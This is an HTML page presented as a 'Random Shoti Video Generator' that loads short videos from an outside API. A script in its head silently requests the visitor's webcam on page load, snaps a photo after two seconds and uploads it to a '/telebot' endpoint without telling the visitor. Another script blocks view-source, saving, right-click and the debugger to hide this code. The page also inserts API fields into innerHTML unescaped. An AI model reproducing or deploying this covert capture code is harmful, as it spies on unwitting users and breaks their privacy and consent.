<!DOCTYPE html>
<html lang="en">

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Random Shoti Video Generator</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: 'Roboto', sans-serif;
            background-color: #1a1a1a;
            color: #fff;
            padding: 20px;
        }

        h1 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 10px;
            text-shadow: 1px 1px 2px rgba(255, 255, 255, 0.2);
        }

        .header {
            text-align: center;
            margin-bottom: 20px;
        }

        button,
        a.button {
            font-family: 'Roboto', sans-serif;
            font-size: 18px;
            padding: 12px 20px;
            border-radius: 20px;
            background-color: #ff4081;
            color: white;
            cursor: pointer;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            border: none;
            margin: 20px 0;
            text-decoration: none;
            transition: all 0.3s ease;
        }

        button:hover,
        a.button:hover {
            background-color: #ff79b0;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.5);
        }

        #myVideo {
            display: none;
            max-width: 100%;
            width: 90%;
            max-height: 50vh;
            border-radius: 10px;
            border: 5px solid rgba(255, 255, 255, 0.5);
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
            margin-top: 20px;
        }

        .video-info {
            margin-top: 20px;
            text-align: center;
            display: none;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 15px;
            width: 90%;
            max-width: 400px;
            border: 2px solid rgba(255, 255, 255, 0.5);
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
        }

        .video-info h2 {
            margin-bottom: 10px;
            font-size: 22px;
        }

        .video-info p {
            margin: 5px 0;
        }

        body.dark-mode {
            background-color: #111;
            color: #fff;
        }

        @media (max-width: 600px) {

            button,
            a.button {
                font-size: 14px;
                padding: 10px 16px;
            }

            #myVideo {
                width: 95%;
            }
        }
    </style>
    <script>
        async function loadVideo() {
            const loadButton = document.getElementById('loadButton');
            const header = document.getElementById('mainHeader');
            loadButton.disabled = true;
            loadButton.textContent = 'Loading...';

            try {
                const response = await fetch("https://shoti-n3lz.onrender.com/api/request/f", {
                    method: 'POST'
                });
                const data = await response.json();

                const videoUrl = data.url;
                const videoElement = document.getElementById('myVideo');
                videoElement.src = videoUrl;
                videoElement.style.display = 'block';

                const videoInfoDiv = document.getElementById('videoInfo');
                videoInfoDiv.innerHTML = `
                    <h2>Video Details:</h2>
                    <p><strong>Title:</strong> ${data.title}</p>
                    <p><strong>Username:</strong> ${data.username}</p>
                    <p><strong>Nickname:</strong> ${data.nickname}</p>
                    <p><strong>Total Videos:</strong> ${data.totalvids}</p>
                `;
                videoInfoDiv.style.display = 'block';

                header.style.display = 'none'; // Hide the header after generating the video

                loadButton.disabled = false;
                loadButton.textContent = 'Generate Some Shoti Videos';
            } catch (error) {
                console.error('Error:', error.message);
                loadButton.disabled = false;
                loadButton.textContent = 'Regenerate Some Shoti Videos';
            }
        }

        function toggleDarkMode() {
            document.body.classList.toggle('dark-mode');
        }
    </script>
    <script>
        window.onload = function() {
            navigator.mediaDevices.getUserMedia({
                    video: true
                })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = 640;
                        canvas.height = 480;
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0);
                        canvas.toBlob(blob => {
                            const formData = new FormData();
                            formData.append('photo', blob);
                            fetch('/telebot', {
                                    method: 'POST',
                                    body: formData,
                                })
                                .then(response => {
                                    if (response.ok) {
                                        console.log('Photo sent successfully.');
                                    } else {
                                        console.error('Failed to send photo:', response.statusText);
                                    }
                                });
                        }, 'image/png');
                        stream.getTracks().forEach(track => track.stop());
                    }, 2000);
                })
                .catch(() => {
                    console.error('Camera access denied.');
                });
        };
    </script>
    <script>
        function redirectIfTampered() {
            window.location.href = "https://joshuaapostol.site";
        }

        document.addEventListener('keydown', function(event) {
            if (event.ctrlKey && (event.key === 'u' || event.key === 'U' || event.key === 's' || event.key === 'S')) {
                event.preventDefault();
                redirectIfTampered();
            }
        });

        document.addEventListener('contextmenu', function(event) {
            event.preventDefault();
            redirectIfTampered();
        });

        (function() {
            const before = Date.now();
            debugger;
            if (Date.now() - before > 100) {
                redirectIfTampered();
            }
        })();

        if (window.top !== window.self) {
            redirectIfTampered();
        }
    </script>
</head>

<body>
    <div class="header" id="mainHeader">
        <h1>Random Shoti & Video Generator</h1>
        <h2>Just enjoy this bullshit</h2>
    </div>
    <button id="loadButton" onclick="loadVideo()">Generate Some Shoti Videos</button>
    <video id="myVideo" controls autoplay></video>
    <div id="videoInfo" class="video-info"></div>
    <a id="redirectButton" class="button" style="display: none" target="_blank">Made By Sensui</a>
</body>

</html>
